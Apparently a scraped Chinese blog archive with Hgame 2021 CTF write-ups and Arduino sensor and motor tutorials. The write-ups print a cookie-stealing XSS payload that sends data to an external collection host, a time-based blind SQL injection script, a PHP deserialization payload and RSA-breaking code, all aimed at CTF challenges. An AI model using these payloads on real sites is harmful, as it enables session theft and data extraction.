侵删","link":"/2021/02/13/%E6%BF%80%E5%85%89%E6%B5%8B%E8%B7%9D/"},{"title":"Hgame Week2 Writeup","text":"摘要菜鸡视角 hgame 游戏体验 WEB第一题 首先，/www.zip 存在源码泄露。 1234567891011//config.ini[global]debug = true[admin]username = adminpass_md5 = b02d455009d3cf71951ba28058b2e615[testuser]username = testuserpass_md5 = 0e114902927253523756713132279690 通过阅读源码了解到，需要以 admin 账户登录才能获得 flag。 但是很显然我们只能利用 php比较漏洞 来登录 testuser 账户，但是这样显然无法得到 flag。 但是 admin 被加密的 MD5 尝试了很多办法也无法解码。这时候得利用 变量覆盖 将$_SESSION['username']的值变为 admin。 在lazy.php存在一段过滤代码，会将请求中所有键名进行过滤，但是只过滤了一遍，这里造成了漏洞。 我们可以构造 payload ： 1_SESSSESSIONION[username]=admin&amp;submit=getflag POST 发送数据即可得到flag 第二题这题很明显是考的 XSS，为此煞费苦心自己搭建了一个 XSS 平台，用的是莲花战队的源码 题目图下： 网页逻辑：第一个文本框中输入信息，点击 Post it 后会显示在下面的留言区；第二个输入框输入验证码，点击提交后，服务器会自动浏览你的留言。但是我们必须有管理员的 token 才能点击左上角的 flag 获得 flag。所以我们要做的： 写一段 xss代码 能够截取浏览者cookies 并发送到 xss平台 爆破一个字符串，使得这个字符串经过 MD5 加密后的前六位与验证码提示框中给出的验证码相同 等待服务器读取留言，xss 平台会收到来自 admin 的 token 使用管理员的 token 点击 flag 获取答案 这个网站的 XSS 过滤原则很有趣，script变div，遇到http ptth直接删除，遇到onerror转换成rorreon并将所有字符串反转，遇到rorreon转换成onerror并将所有字符串反转 经过精致打磨，写出了 xss 代码如下： &gt;vid&lt;&gt;&quot;;)()};))()}}''nruter{)e(hctac}'':ferh.noitacol.renepo.wodniw?)ferh.noitacol.renepo.wodniw&amp;&amp;renepo.wodniw(nruter{yrt{)(noitcnuf((epacse+'=renepo&amp;'+))()}}''nruter{)e(hctac}eikooc.tnemucod nruter{yrt{)(noitcnuf((epacse+'=eikooc&amp;'+))()}}''nruter{)e(hctac}ferh.noitacol.pot nruter{yrt{)(noitcnuf((epacse+'=noitacolpot&amp;'+))()}}''nruter{)e(hctac}ferh.noitacol.tnemucod nruter{yrt{)(noitcnuf((epacse+'=noitacol&amp;1=noissespeek?/'+etisbew=crs.))(egamI wen({)(noitcnuf(;'php.xedni/moc.sduolcjm.ssx//:s'+b+a=etisbew rav ;'ptt'=b rav ;'h'=a rav&quot;=rorreon x=crs gmi&lt;&gt;vid/&lt; 提交后不一会，我的 XSS 收到了我自己的 cookies。 说明 XSS成果，下一步是要破解那个验证码。无从下手，于是写了个 Python 爆破，就测试五位数字看看,跑不出那就删除 cookie 刷新页面，重发脚本，使用新的验证码，总有能成功的。 1234567891011121314151617181920212223242526272829import hashlibimport randomdef encryption(chars): return hashlib.md5(chars.encode('utf-8')).hexdigest()def generate(): return str(random.randint(99999, 1000000))def main(): start = &quot;313094&quot; while True: strs = generate() print(&quot;Test&quot;, strs) if encryption(strs).startswith(start): print(&quot;yes!&quot;) print(&quot;[+] %s &quot; % strs + &quot;%s &quot; % encryption(strs)) break else: print(&quot;no!&quot;)if __name__ == '__main__': main() print('完成！') 当时我成功了： 提交！随后 XSS 平台就收到了管理员的token ： 修改 token 得到 flag ！ 第四题 先注册账号，这里不吐槽了，简单的用户名已经都被注册了…. 很明显，差两张券，这里运用条件竞争，方便点用 Burp，低线程兑换券，一次兑换一张，高线程兑换非法数量的券，我使用数量 0 ，设置如下（左侧100线程，右侧50线程）： Attack！ 不一会就有结果了： flag GET！ Crypto第三题 很 esay 直接上脚本： 123456789101112131415import libnumfrom Crypto.Util.number import long_to_bytesc = 747831491353896780365654517748216624798517769637260742155527n = 882564595536224140639625987659416029426239230804614613279163# n = int(&quot;&quot;,16)e = 65537# e = int(&quot;&quot;,16)q = 1029224947942998075080348647219p = 857504083339712752489993810777d = libnum.invmod(e, (p - 1) * (q - 1))m = pow(c, d, n) # m 的十进制形式string = long_to_bytes(m) # m明文print(string) # 结果为 b‘ m ’ 的形式 FLAG get！ MISC第四题 pcapng 文件，使用 Wireshark 打开，迅速锁定一个奇怪网址： 去 cf.hgame2021.cf 看看，发现有连续不断的弹窗。 那我们禁用 js 获得线索，flag 果然不在这 …. 既然说到 SPF 那我们就查看一下 SPF记录吧。 然后 flag 就出来了？ 总结自己好菜","link":"/2021/02/13/Hgame%20weel2%20Writeup/"},{"title":"Hgame week1 Writeup","text":"摘要第一次参加CTF，小白视角参赛体验，从零开始学CTF [TOC] WEB第一题Hitchhiking_in_the_Galaxy 这一题其实我看了蛮久的，好几题那没看出啥来，不过后来想到这题只有100分，那应该不是很难。果然是自己想太多！ 题解打开网页 http://hitchhiker42.0727.site:42420/ ，看到如下页面 直接一个404，没啥信息，于是 F12 打开控制台看看有没有什么线索。header 里没看见什么奇怪的信息，只有页面源代码给出了一个 link 连接HitchhikerGuide.php 那就去看看那里有啥。 直接访问 http://hitchhiker42.0727.site:42420/HitchhikerGuide.php 好家伙又来到404页面，但是注意到这次来到的是index.php。打开控制台，发现是302转向到了index.php页面。 大胆猜测 maybe 访问方式不对，那把 GET 方式换成 POST方式试试。打开 Hackbar 插件，启用 POST请求，发送！有信息了！ 使用Infinite Improbability Drive方式？可能再说 User-Agent ？那 header 里加上 User-Agent 看看。 好家伙，成功了。不过又说要从 Cardinal 过来，那么很 easy，header 里再加上 Referer参数。 没毛病，成功了。又说要本地访问，那就在 header 里加个X-Forwarded-For参数，值为127.0.0.1。 GET！hgame{s3Cret_0f_HitCHhiking_in_the_GAl@xy_i5_dOnT_p@nic!} 第二题 Watermelon简单上头的小游戏——真的上头，完了好久好久！ 不难发现，得到了 2000 分才能拿到 flag。 也许能通过操作 js 来获得 flag。 通过审计页面源代码，很快定位到了一个叫project.js的文件，里面的变量 e 应该就是分数。 发现里面有这样一段代码： 12345gameOverShowText: function (e, t) { if(e &gt; 1999){ alert(window.atob(&quot;aGdhbWV7ZG9feW91X2tub3dfY29jb3NfZ2FtZT99&quot;)) }}, atob() 方法用于解码使用 base-64 编码的字符串，那么aGdhbWV7ZG9feW91X2tub3dfY29jb3NfZ2FtZT99应该就是 base-64 编码的字符串。解码一下 GET！hgame{do_you_know_cocos_game?} 第三题 宝藏走私者 这应该是一道关于HTTP走私的题目，目前知识学明白了，但操作上不知道哪出了问题一直没成功。 BUT！我好像多次搭上了顺风车 flag如上图，具体搞明白了再补充吧。 第四题 智商检测鸡 ​ 100道定积分计算，做完给flag。服务器通过临时session来识别用户，因此手算必然不可能。那么试试自动计算？ ​ 瞬间想到Python，打算试试 selenium 自动化。但是对于分析了页面源码后，我发现以我现有水平读取积分上下限的值和程式有难度（负号在单独的标签里）。所以打算先收算几道看看有没有啥规律。 ​ 然后在微软数学手机软件的帮助下，做了十几道题，发现规律——积分下限都是负整数，上限都是正整数，积分式子都是 Ax+B的形式，其中 A 和 B 都为正整数 那就很 ez 了，编写Python代码： 1234567891011121314151617181920212223242526272829303132from time import sleep //导入sleep包来使用sleep函数from selenium import webdriver //导入webdriver自动化组件from sympy import * //sympy里的integrate函数用于定积分计算wd = webdriver.Chrome(r'chromedriver.exe') //定位chrome浏览器自动化的驱动程序（因为我使用chrome）wd.get('http://r4u.top:5000/') //打开网页窗口，自动访问该网页sleep(1) //我怕网页没加载好就开始寻找元素，那必报错，所以让程序sleep一会for i in range(100): //100道题，循环100次 try: inPutBox = wd.find_element_by_id('answer') //定位答案输入框 clickBtn = wd.find_element_by_css_selector('.btn.btn-primary') //定位验证答案框 a = &quot;-&quot; + wd.find_element_by_css_selector('#integral &gt; math &gt; mrow &gt; msubsup &gt; mrow:nth-child(2) &gt; mn').text //积分下限 b = wd.find_element_by_css_selector('#integral &gt; math &gt; mrow &gt; msubsup &gt; mrow:nth-child(3) &gt; mn').text //积分上限 c = wd.find_element_by_css_selector('#integral &gt; math &gt; mrow &gt; mn:nth-child(3)').text //积分式 Ax+B 中的 A d = wd.find_element_by_css_selector('#integral &gt; math &gt; mrow &gt; mn:nth-child(6)').text //积分式 Ax+B 中的 B a = int(a) //字符串转数字 b = int(b) //字符串转数字 c = int(c) //字符串转数字 d = int(d) //字符串转数字 x = symbols('x') //x为积分变量 result = str(integrate(c * x + d, (x, a, b))) //计算答案，同时转换为字符串格式 if '/' in result: //这里很重要，定积分计算结果不是用小数表示的，比如 1.5 是用 3/2 表示的，所以要处理一下 eq = result.split('/') result = float(eq[0]) / float(eq[1]) result = str(result) //用split函数把分子分母取出来，转换成浮点数除一下，就得到小数了，最后转换成字符串 inPutBox.send_keys(result) //向输输入框中输入答案 clickBtn.click() //自动点击验证答案切换到下一题 finally: //没学过python的，本来想试一下try，然后就出现了没啥用的try-finally结构 sleep(1) //等下一题加载出来 inPutBox.clear() //清空输入框 Ctrl+Shift+F10，稍等片刻： 得到Flag hgame{3very0ne_H4tes_Math} 第五题 走私者的愤怒我还没整明白 MISC第一题 Base全家福 这题蛮easy的，都说了 Base全家福 那应该就是 Base混合编码的解码，直接用 python 解决 12345678910111213141516171819import base64f = open('base.txt')content = &quot;&quot;for i in f.readlines(): content = content + i.replace('\\r', '').replace('\\n', '').replace('\\t', '')f.close()while True: try: content = base64.b64decode(content).decode() except: try: content = base64.b32decode(content).decode() except: try: content = base64.b16decode(content).decode() except: print('result: ', content) break 运行！ 得到Flag result: hgame{We1c0me_t0_HG4M3_2021} 啊哈原来是签到题 参考文章: X-Forwarded-For 伪造Localhost","link":"/2021/02/04/Hgame%20week1%20Writeup/"},{"title":"Hgame Week3 Writeup","text":"摘要Week 3 巨难 Crypto–LikiPrime 这题应该是最 ez 的了。 首先去[factordb.com](http://factordb.com/index.php）把 n 给分解了，运气比较好这里能成功分解，于是我们便拥有了 p 和 q，然后可以计算 p 这题就解决了。脚本如下： 12345678910111213141516import libnumfrom Crypto.Util.number import long_to_bytesc = 747831491353896780365654517748216624798517769637260742155527n = 882564595536224140639625987659416029426239230804614613279163# n = int(&quot;&quot;,16)e = 65537# e = int(&quot;&quot;,16)q = 1029224947942998075080348647219p = 857504083339712752489993810777d = libnum.invmod(e, (p - 1) * (q - 1))m = pow(c, d, n) # m 的十进制形式string = long_to_bytes(m) # m明文print(string) # 结果为 b‘ m ’ 的形式#b'hgame{w0w~yOU_kNoW+R5@!}' –HappyNewYear!! 这题也考的是 RSA，根据描述可知，有消息相同，然后打开文件发现 e=3，e太小了。 在 Google 上逛了半天，了解了不少 RSA 破解算法，锁定了一个叫低加密指数广播攻击的方法，该方法适用于加密指数e比较低，并且使用了相同的加密指数e给若干个接收者发送相同的信息的情况，适用于本题。 但哪几个消息是相同的？总共给了七组数据，他们之间有 128 种组合，所以必须先用脚本得出所有组合。（最开始直接把七组数据进行低加密指数广播攻击的脚本中，发现毫无结果，全是乱码，后来才意识到又的消息应该不一样） 这里要用到 gmpy 库，但只支持 python2，所以我又不得不安装了python2 那么最终脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#python2.7import gmpyimport gmpy2from Crypto.Util.number import long_to_bytesdef boradcast_fuzz(question, e): #广播攻击 N = 1 for i in range(len(question)): N *= question[i]['n'] N_list = [] for i in range(len(question)): N_list.append(N / question[i]['n']) t_list = [] for i in range(len(question)): t_list.append(int(gmpy2.invert(N_list[i], question[i]['n']))) sum = 0 for i in range(len(question)): sum = (sum + question[i]['c'] * t_list[i] * N_list[i]) % N sum = gmpy.root(sum, e)[0] # return libnum.n2s(sum) return long_to_bytes(sum)def getArraySubSet(originArray): #获得子集 result = [[]] for i in range(len(originArray)): for j in range(len(result)): result.append(result[j] + [originArray[i]]) return resultn0 = c0 = n1 = c1 = n2 = c2 = n3 =c3 = n4 =c4 =n5 =c5 =n6 =c6 =originArray = [ {'n': n0, 'c': c0}, {'n': n1, 'c': c1}, {'n': n2, 'c': c2}, {'n': n3, 'c': c3}, {'n': n4, 'c': c4}, {'n': n5, 'c': c5}, {'n': n6, 'c': c6}]subset = getArraySubSet(originArray)print(&quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&quot;)for arr in subset: if not arr: continue res = boradcast_fuzz(arr, 3) print res print(&quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&quot;) 运行得到输出 提取一下有用信息： +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++I am afraid the dishes in the second grade are too fragrant, you will not reply my text messages,so I won’t give you New Year greetings this year, I hope you don’t know how to praise, good night. hgame{!f+y0u-pl4y_rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++Hello Liki4: I am afraid that there are too many blessings on the 30th night, you will not see my greetings,I am afraid that the firecrackers in the first grade are too noisy, you will not hear my blessings, @ind3r~YOu^9ot=i7} +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ 然后结合一下得到 flag hgame{!f+y0u-pl4y_rem@ind3r~YOu^9ot=i7} WEB–Liki-Jail 最开始毫无想法，后来了解了下 sqlmap，然后学习了时间盲注的知识，最后试来试去在密码处发现了 sql 注入漏洞。编写 python ，把密码一位一位爆出来。 考虑到一般密码都是正常的字符，所以 ascii 码值应该都介于 30~130 之间，那么对密码的每一位都使用二分法比较，结合 if 语句，判断为真则 sleep(2)，以此确定密码的每一位。 程序如下：（得关VPN） 123456789101112131415161718192021222324252627282930313233343536import timeimport requestsurl = 'https://jailbreak.liki.link/login.php'result = &quot;&quot;for a in range(1, 20): max = 130 min = 30 while max &gt;= min: mid = (max + min) // 2 print(mid) data = { &quot;username&quot;: &quot;admin\\\\&quot;, &quot;password&quot;: &quot;/**/or/**/if(ascii(substr((select/**/group_concat(`p@ssword`)/**/from/**/u5ers),&quot; + str( a) + &quot;,1))&gt;&quot; + str(mid) + &quot;,sleep(2),0)#&quot; } print(data['username']) print(data['password']) try: t1 = time.time() r = requests.post(url, data=data, verify=False).text t2 = time.time() except: t1 = time.time() r = requests.post(url, data=data, verify=False).text t2 = time.time() if t2 - t1 &gt; 2: min = mid + 1 else: max = mid if max == mid == min: result += chr(mid) print(str(a) + ':' + result) break 最后得到 password ：sOme7hiNgseCretw4sHidd3n 最后用 admin 登录即可获得 flag –Arknights 题目说到用 git 部署到服务器，怀疑存在 .git 文件夹。通过 git_extract 获得到了网站源码。 接下来进行代码审计，从头到尾没有没有敏感函数，但是注意到在 simulate.php 中有一串 secret_key： 同时 extract 函数有一个反序列化操作，说明 Data 可控。 Eval 类可以 echo this-&gt;message，CardsPool 类的 toString 函数可以读文件。 所以要做的就是将 Eval 类的 $msg 指向 ClassPool 类，$file 的值赋值为 $file。随后生成序列化后的字符串，再经过 base64 编码，放回到 index.php的 cookie 中，便会获得加密后的 cookie。 构造 test.php： 1234567891011121314&lt;?phpclass CardsPool{ public $cards; private $file=&quot;flag.php&quot;;}class Eeeeeeevallllllll{ public $msg;}$a = new Eeeeeeevallllllll();$a-&gt;msg = new CardsPool();echo serialize($a).&quot;&lt;br&gt;&quot;;echo base64_encode(serialize($a)).&quot;&lt;br&gt;&quot;; 本地运行得到编码后的序列化对象： 本地运行网站源代码，在 extract 函数 中加一句 echo 用来输出加密后的 cookie： 打开 index.php ，将 cookie 改为之前 test.php 序列化后的字符串，刷新得到加密后的 cookie。 复制 cookie，打开网站，替换cookie，刷新。 啥也没发生，但是查看网页源代码就出现了 flag 参考文章:参考链接","link":"/2021/02/21/Hgame-Week3-Writeup/"},{"title":"Arduino 温湿度传感器 DHT11","text":"摘要这里介绍关于 DHT11 温湿度传感器在 arduino 上的使用方法，附头文件 知识准备–单线串口所谓单线串口（全称为单线异步串行通讯接口），不同于标准串口的两根数据线（ Txd 和 Rxd ），单线串口只有一根数据线来同时兼备发送和接收功能，系统的数据交换、控制均由单总线完成。因此，单线串口采用半双工的通讯方式（能双向通信，但一方发送信息的时候另一方不能发送信息，毕竟只有一根线）。单总线通常要求外接一个上拉电阻，以确保当总线闲置时，其状态为高电平，如图以 DHT11为例。 还可以在 VDD 和 GND 直接加一个电容 ，来去耦滤波。 –单总线数据位的定义这里以 DHT11 来说明。（科协给的数据手册确实有点意思，上面讲的比较详细，，这里挑重点说明） DHT11 和主机的通信，一次传送 40 位数据，高位先出，一次通讯 4ms 左右。 数据格式：8bit湿度整数数据 + 8bit湿度小数数据 + 8bit温度整数数据 + 8bit温度小数数据 + 8bit校验位 校验位等于 “8bit湿度整数数据+8bit湿度小数数据+8bit温度整数数据+8bit温度小数数据” 所得结果的末8位。 通讯过程： 主机发送一次开始信号后，DHT11 从低功耗模式转换到高速模式，等待主机开始信号结束后，DHT11 发送响应信号，送出40bit的数据，并触发一次信号采集，用户可选择读取部分数据，DHT11 采集数据后转换到低速模式。所以我们每一次读取的数据是上一次的采集结果 时序图： 起始信号：微处理器把数据总线（SDA）拉低一段时间至少 18ms（最大不得超过30ms）。通知传感器准备数据。 响应信号：传感器把数据总线（SDA）拉低 83μs，再接高 87μs 以响应主机的起始信号。 数据：传感器一次性从数据总线（SDA）串出40 位数据，高位先出 最后从机拉低 50μs ，随后总线由上拉电阻拉高释放总线进入空闲状态。 –相对湿度Relative humidity is the amount of water vapor in air vs. the saturation point of water vapor in air. At the saturation point, water vapor starts to condense and accumulate on surfaces forming dew. The saturation point changes with air temperature. Cold air can hold less water vapor before it becomes saturated, and hot air can hold more water vapor before it becomes saturated. 简单点说，相对湿度就是空气中水蒸气的量与空气中水蒸气的饱和点（饱和点：水蒸气开始凝结并积聚在形成露水的表面，其值随气温变化）的比值。 相对湿度计算公式： 100％RH 下，会发生凝结；0％ 下，空气完全干燥。 –数字温湿度传感器及原理温度传感器组件有很多种，像热敏电阻、DS18B20 、TMP36 、LM335A 等。DHT11 其实是一款结合温湿度传感器及信号处理 IC 的感测模块，外观如下。 连接 arduino 时。建议在电源与数据输出脚连接一个 10kΩ 电阻，电源和接地脚之间接一个 0.1μF(104) 电容，原因在上文有提及。怕麻烦可以直接买最右侧的。 那么它是如何从测量温度和湿度的？ DHT11 通过测量两个电极之间的电阻来检测水蒸气。两个电极之间的电阻变化与相对湿度成正比。较高的相对湿度会降低电极之间的电阻，而较低的相对湿度会增加电极之间的电阻。 DHT11 通过 NTC温度传感器（热敏电阻）来测量温度 。 设计方案 材料清单 材料 数量 Arduino Uno 1 DHT11 1 10kΩ 电阻（三脚的 DHT11不需要，但四脚的 DHT11 也非强制需要） 1 导线 3 代码这里需要引入 DHT11 第三方库。下载链接 打开压缩包有两个文件 找到 Arduino 的 libraries 地址，一般默认会在 C:\\Documents\\Arduino\\libraries （因人而异），里面有不少已经安装好的官方库。 我们新建一个文件夹dth11，名字随意取，不一定要我这个。 把压缩包里的两个文件复制进去，大功告成。 测试程序： 1234567891011121314151617181920212223242526272829303132#include &lt;DHT.h&gt; //引用dht11库文件，使得下面可以调用相关参数#define DHTPIN 8 //定义温湿度针脚号为8号引脚#define DHTTYPE DHT11 // DHT 11 实例化一个对象DHT dht(DHTPIN, DHTTYPE);void setup() { Serial.begin(9600); //设置波特率参数 Serial.println(F(&quot;数据接收开始！&quot;)); dht.begin();}void loop() { delay(2000); //在测量之间等待几秒钟，因为测量速度超级慢。 float h = dht.readHumidity(); //读取温度为摄氏度（默认值） float t = dht.readTemperature(); //检查是否有任何读取失败并提前退出（再试一次）。 if (isnan(h) || isnan(t)) { Serial.println(F(&quot;无法从DHT传感器读取！&quot;)); return; }// Humidity湿度 Serial.print(F(&quot;Humidity: &quot;)); Serial.print(h);//Temperature 温度 Serial.print(F(&quot;% Temperature: &quot;)); Serial.print(t); Serial.print(F(&quot;°C &quot;)); Serial.print(&quot;\\n&quot;);} 成果展示这里不打算拍视频了。 运行一切正常，随意拔出一根线随即输出 ”无法从DHT传感器读取！“ 侵删","link":"/2021/02/22/Arduino-%E6%B8%A9%E6%B9%BF%E5%BA%A6%E4%BC%A0%E6%84%9F%E5%99%A8-DHT11/"},{"title":"Arduino Mega2560 基础模块小综合","text":"摘要以前做过个课题，整个项目是建立在 arduino 上的，但是程序比较乱，现在正好趁这个机会完善一下。 [TOC] 设计目标通过按钮控制两组十字滑杆上下左右运动，并通过显示器显示实时坐标。 难点 LED 显示 总共五个按钮，四个为方向键，另一个切换十字滑杆 步进电机控制 设计方案– 零部件选型本装置搭建所需的材料及零部件的选型中十字丝杠滑台、电机及电机驱动器、Arduino 控制板是重点。 十字丝杠滑台的选择主要考虑尺寸问题。为了以后自己搭 3D打印机做准备（已经买了赤兔主板，在研究），就买了400mm×400mm规格的滚珠丝杆滑台。 电机选型主要考虑合适的扭矩，电机驱动器则需要与电机配套，最后选用了 42步进电机及 DM542 电机驱动器。 Arduino 控制板有各种配置，选型时主要考虑针脚数量需求。由于装置预计大约需要15个针脚，超出 Arduino nano、Arduino uno 的针脚数，最终选择了拥有更多针脚的 Arduino Mega 2560 控制板（省事）。 – 硬件连接设计 按钮控制开关、超声波传感器、LCD液晶屏与Arduino Mega2560单片机的线路连接如图： 电机驱动器与 Arduino Mega2560 单片机的线路连接如图： – 软件设计软件设计主要是逻辑问题，关于代码，这里展示电机控制部分关键代码。 123456789101112131415161718192021222324//以左侧x方向电机为例，程序如下：if (Choice_LorR == 0) //Choice_LorR为0时控制左边电机 { //向左按钮按下 else if (State_B_L == HIGH) { Serial.println(&quot;Left left&quot;); // tone(EM_Pulse_common, 8000); digitalWrite(EM_enable_M2, HIGH); digitalWrite(EM_2_4_dirX_common, HIGH); delay(50); } //向右按钮按下 else if (State_B_R == HIGH) { Serial.println(&quot;Left right&quot;); // tone(EM_Pulse_common,8000); digitalWrite(EM_enable_M2, HIGH); digitalWrite(EM_2_4_dirX_common, LOW); delay(50); } } 程序完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218#include &lt;SR04.h&gt; //调用SR04头文件,用于超声波测量#include &lt;Wire.h&gt; //用于液晶显示#include &lt;LiquidCrystal_I2C.h&gt; //用于液晶显示//定义Arduino板与4个电机驱动器的连接#define EM_Pulse_common 7 // 定义电机控制脉冲信号PIN脚，4路电机脉冲信号共用同一个PIN脚#define EM_1_3_dirY_common 3 //定义两个上下移动电机的上下移动方向控制信号，两路电机方向信号共用一个PIN脚。电机1为左方上下移动电机,电机3为右方上下移动电机#define EM_2_4_dirX_common 5 //定义两个左右移动电机的左右移动方向控制信号，两路电机方向信号共用一个PIN脚。电机2为左方左右移动电机,电机4为右方左右移动电机#define EM_enable_M1 4 // 1号电机enable脚定义#define EM_enable_M2 6 // 2号电机enable脚定义#define EM_enable_M3 13 // 3号电机enable脚定义#define EM_enable_M4 12 // 4号电机enable脚定义//定义Arduino板操作按钮总开关的连接#define B_General 2 //左方丝杠十字滑台 vs 右方丝杠十字滑台//定义Arduino板与上、下、左、右四方向按钮的连接#define B_U 11 // 向上移动按钮对应的Arduino PIN脚#define B_D 10 // 向下移动按钮对应的Arduino PIN脚#define B_L 9 // 向左移动按钮对应的Arduino PIN脚#define B_R 8 // 向右移动按钮对应的Arduino PIN脚//以下定义全局变量并初始化//上下左右按钮状态变量定义int State_B_U = 0; // 向 上 移动 按钮状态变量定义int State_B_D = 0; // 向 下 移动 按钮状态变量定义int State_B_L = 0; // 向 左 移动 按钮状态变量定义int State_B_R = 0; // 向 右 移动 按钮状态变量定义bool Choice_LorR = 0; // 总控制按钮状态变量声明//超声波传感器设置,UV1/2/3/4分别对应左侧Y/X、右侧Y/X位置const int UV1_TrigPin = A1;const int UV1_EchoPin = A2;const int UV2_TrigPin = A3;const int UV2_EchoPin = A4;const int UV3_TrigPin = A5;const int UV3_EchoPin = A6;const int UV4_TrigPin = A7;const int UV4_EchoPin = A8;//定义超声波传感器类变量，分别对应各传感器// 定义ultrasonic1/2/3/4为4个SR04类变量，分别对应4个超声波传感器，SR04类变量可以调用函数获取超声波位置数据SR04 ultrasonic1 = SR04(UV1_TrigPin, UV1_EchoPin); SR04 ultrasonic2 = SR04(UV2_TrigPin, UV2_EchoPin); SR04 ultrasonic3 = SR04(UV3_TrigPin, UV3_EchoPin); SR04 ultrasonic4 = SR04(UV4_TrigPin, UV4_EchoPin); //液晶屏设置LiquidCrystal_I2C lcd(0x27, 20, 4); // 液晶显示地址设置 set the LCD address to 0x27 for a 16 chars and 2 line displayvoid setup() { Serial.begin(9600); pinMode(B_General, INPUT); // 控制左方滑台电机还是右侧滑台电机 pinMode(B_U, INPUT); // 向 上 移动 pinMode(B_D, INPUT); // 向 下 移动 pinMode(B_L, INPUT); // 向 左 移动 pinMode(B_R, INPUT); // 向 右 移动 //Arduino板输出信号定义 pinMode(EM_1_3_dirY_common, OUTPUT); pinMode(EM_2_4_dirX_common, OUTPUT); pinMode(EM_enable_M1, OUTPUT); pinMode(EM_enable_M2, OUTPUT); pinMode(EM_enable_M3, OUTPUT); pinMode(EM_enable_M4, OUTPUT); pinMode(EM_Pulse_common, OUTPUT); //使用起动时候电机不会工作 digitalWrite(EM_enable_M1, LOW); digitalWrite(EM_enable_M2, LOW); digitalWrite(EM_enable_M3, LOW); digitalWrite(EM_enable_M4, LOW); //LCD初始化 lcd.init(); // initialize the lcd lcd.backlight();}void loop() { tone(EM_Pulse_common, 8000); //电机驱动器控制脉冲设置 if (digitalRead(B_General) == HIGH) //当按下开关时将切换控制方向，当Choice_LorR=0时控制左侧滑台电机，当Choice_LorR=1时控制右侧滑台电机 { Serial.println(&quot;in loop&quot;); Choice_LorR = !(Choice_LorR); Serial.println(Choice_LorR); delay(500); } //读取方向按钮信号 State_B_U = digitalRead(B_U); State_B_D = digitalRead(B_D); State_B_L = digitalRead(B_L); State_B_R = digitalRead(B_R); //左侧滑台电机控制 if (Choice_LorR == 0) //Choice_LorR为0时控制左边电机 { //向上按钮按下 if (State_B_U == HIGH) { Serial.println(&quot;Left UP&quot;); digitalWrite(EM_enable_M1, HIGH); Serial.println(&quot;after enable&quot;); digitalWrite(EM_1_3_dirY_common, HIGH); delay(50); } //向下按钮按下 else if (State_B_D == HIGH) { Serial.println(&quot;Left down&quot;); //tone(EM_Pulse_common,8000); digitalWrite(EM_enable_M1, HIGH); digitalWrite(EM_1_3_dirY_common, LOW); delay(50); } //向左按钮按下 else if (State_B_L == HIGH) { Serial.println(&quot;Left left&quot;); // tone(EM_Pulse_common, 8000); digitalWrite(EM_enable_M2, HIGH); digitalWrite(EM_2_4_dirX_common, HIGH); delay(50); } //向右按钮按下 else if (State_B_R == HIGH) { Serial.println(&quot;Left right&quot;); // tone(EM_Pulse_common,8000); digitalWrite(EM_enable_M2, HIGH); digitalWrite(EM_2_4_dirX_common, LOW); delay(50); } } else { //向上按钮按下 if (State_B_U == HIGH) { Serial.println(&quot;Right UP&quot;); tone(EM_Pulse_common, 8000); digitalWrite(EM_enable_M3, HIGH); digitalWrite(EM_1_3_dirY_common, HIGH); delay(50); } //向下按钮按下 else if (State_B_D == HIGH) { Serial.println(&quot;Right down&quot;); tone(EM_Pulse_common, 8000); digitalWrite(EM_enable_M3, HIGH); digitalWrite(EM_1_3_dirY_common, LOW); delay(50); } //向左按钮按下 else if (State_B_L == HIGH) { Serial.println(&quot;Right left&quot;); // tone(EM_Pulse_common,8000); digitalWrite(EM_enable_M4, HIGH); digitalWrite(EM_2_4_dirX_common, LOW); delay(50); } //向右按钮按下 else if (State_B_R == HIGH) { Serial.println(&quot;Right right&quot;); // tone(EM_Pulse_common,8000); digitalWrite(EM_enable_M4, HIGH); digitalWrite(EM_2_4_dirX_common, HIGH); delay(50); } } digitalWrite(EM_enable_M1, LOW); digitalWrite(EM_enable_M2, LOW); digitalWrite(EM_enable_M3, LOW); digitalWrite(EM_enable_M4, LOW); //使用GetDistance()函数获取当前超声波传感器返回的距离值,并存入变量distance中 //LCD显示设置，4行分别显示当前位置，单位cm float distance_2_Left_X = 440-ultrasonic2.GetDistance() * 10; //左-X 位置 Serial.println(distance_2_Left_X); lcd.setCursor(0, 0); lcd.print(&quot;Left(mm)&quot;); lcd.setCursor(11, 0); lcd.print(&quot;Right(mm)&quot;); lcd.setCursor(0, 1); lcd.print(&quot;X=&quot;); lcd.print(distance_2_Left_X, 1); float distance_4_Right_X = 450-ultrasonic4.GetDistance()*10; //右-X 位置 Serial.println(distance_4_Right_X); lcd.setCursor(11, 1); lcd.print(&quot;X=&quot;); lcd.print(distance_4_Right_X,1); float distance_1_Left_Y = 65+ultrasonic1.GetDistance()*10; //左-Y 位置 Serial.println(distance_1_Left_Y); lcd.setCursor(0, 2); lcd.print(&quot;Y=&quot;); lcd.print(distance_1_Left_Y,1); float distance_3_Right_Y = 65+ultrasonic3.GetDistance()*10; //右-Y 位置 Serial.println(distance_3_Right_Y); lcd.setCursor(11, 2); lcd.print(&quot;Y=&quot;); lcd.print(distance_3_Right_Y,1);} 过程性图片 成品展示 参考文章:参考链接","link":"/2021/02/26/arduino%E5%9F%BA%E7%A1%80%E6%A8%A1%E5%9D%97%E5%B0%8F%E7%BB%BC%E5%90%88/"},{"title":"刚学Python，做了个练手小项目——我爱记单词 无敌辅助","text":"摘要刚刚写了个练手小项目，个人还是比较满意的。我觉得这是个好东西，分享给大家玩玩！ 这是个控制台程序，没有加 UI，所以界面有一点丑，但不影响 这个项目开源，仓库地址Github，有兴趣可以帮我改改 Bug? 毕竟个人感觉程序里代码重复度太高了，应该是能简化的。 